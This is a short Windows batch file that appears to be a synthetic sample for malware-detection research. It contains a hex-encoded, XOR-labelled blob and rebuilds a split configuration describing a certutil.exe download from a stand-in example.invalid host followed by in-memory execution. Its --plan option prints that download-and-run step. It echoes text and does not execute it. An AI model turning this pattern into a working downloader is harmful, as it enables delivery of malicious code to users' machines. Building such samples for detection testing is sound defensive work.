@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|reverse_xor
rem HUNTRESS-MATERIAL:4752571d00060607520a50011c575a5f52455d5a1d565f435e524b561d515756505050070603031c1c09404347475b0e5f41464f515756505050070603031e5d545a52435e52500e575a6c5d545a52435e52504f565d5c5d0e56545246545d525f6c474b565d4f565f545d5a400e5b435241544f020e475d465c506c56545247404f564b561d5f5a4746474156500e415647435257524f4a415c5e565e6c5b50475243405a571f56475c5e56416c56415a464250520e40435647404f020e45
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapter"
SeT "fragment1==certutil.exe|stage_count=1|graph=single|next_la"
SeT "fragment2=nguage=none|campaign_id=campaign-0054cccedb|url="
SeT "fragment3=https://0054cccedb.example.invalid/2c9a4553.dat"
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=f137fad8"
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo certutil.exe GET https://0054cccedb.example.invalid/2c9a4553.dat then dispatch memory
exit /b 0
